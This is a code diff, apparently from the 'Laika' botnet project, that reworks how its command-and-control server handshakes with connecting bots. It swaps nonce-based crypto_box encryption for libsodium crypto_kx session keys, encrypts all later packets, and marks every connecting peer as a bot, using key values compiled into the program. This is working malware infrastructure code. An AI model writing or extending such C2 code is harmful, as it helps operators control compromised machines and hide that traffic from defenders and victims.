@@ -6,35 +6,38 @@
 #include "cnc.h"
 
 LAIKAPKT_SIZE laikaC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + sizeof(uint8_t) + LAIKAENC_SIZE(LAIKA_NONCESIZE) + crypto_box_PUBLICKEYBYTES
+    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES
 };
 
 void handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     char magicBuf[LAIKA_MAGICLEN];
-    uint8_t nonce[LAIKA_NONCESIZE];
     struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
     uint8_t major, minor;
 
     laikaS_read(&peer->sock, (void*)magicBuf, LAIKA_MAGICLEN);
     major = laikaS_readByte(&peer->sock);
     minor = laikaS_readByte(&peer->sock);
-    peer->type = laikaS_readByte(&peer->sock);
+    peer->type = PEER_BOT;
 
     if (memcmp(magicBuf, LAIKA_MAGIC, LAIKA_MAGICLEN) != 0
         || major != LAIKA_VERSION_MAJOR
         || minor != LAIKA_VERSION_MINOR)
         LAIKA_ERROR("invalid handshake request!\n");
 
-    /* read & decrypt nonce */
-    laikaS_readENC(&peer->sock, nonce, LAIKA_NONCESIZE, cnc->pub, cnc->priv);
-
     /* read peer's public key */
     laikaS_read(&peer->sock, peer->peerPub, sizeof(peer->peerPub));
 
+    /* gen session keys */
+    if (crypto_kx_server_session_keys(peer->sock.inKey, peer->sock.outKey, cnc->pub, cnc->priv, peer->peerPub) != 0)
+        LAIKA_ERROR("failed to gen session key!\n")
+
+    /* encrypt all future packets */
+    laikaS_setSecure(&peer->sock, true);
+
     /* queue response */
-    laikaS_writeByte(&peer->sock, LAIKAPKT_HANDSHAKE_RES);
+    laikaS_startOutPacket(&peer->sock, LAIKAPKT_HANDSHAKE_RES);
     laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
-    laikaS_writeENC(&peer->sock, nonce, LAIKA_NONCESIZE, peer->peerPub); /* encrypt nonce with peer's public key */
+    laikaS_endOutPacket(&peer->sock);
 
     LAIKA_DEBUG("accepted handshake from peer %lx\n", peer);
 }
@@ -64,12 +67,12 @@ struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
 
     /* load keys */
     LAIKA_DEBUG("using pubkey: %s\n", LAIKA_PUBKEY);
-    if (sodium_hex2bin(cnc->pub, crypto_box_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
+    if (sodium_hex2bin(cnc->pub, crypto_kx_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
         laikaC_freeCNC(cnc);
         LAIKA_ERROR("Failed to init cnc public key!\n");
     }
 
-    if (sodium_hex2bin(cnc->priv, crypto_box_SECRETKEYBYTES, LAIKA_PRIVKEY, strlen(LAIKA_PRIVKEY), NULL, &_unused, NULL) != 0) {
+    if (sodium_hex2bin(cnc->priv, crypto_kx_SECRETKEYBYTES, LAIKA_PRIVKEY, strlen(LAIKA_PRIVKEY), NULL, &_unused, NULL) != 0) {
         laikaC_freeCNC(cnc);
         LAIKA_ERROR("Failed to init cnc private key!\n");
     }
@@ -110,7 +113,6 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
                 &cnc->pList,
                 (void*)cnc
             );
-            laikaS_setKeys(peer, cnc->priv, cnc->pub);
 
             /* setup and accept new peer */
             laikaS_acceptFrom(&peer->sock, &cnc->sock);
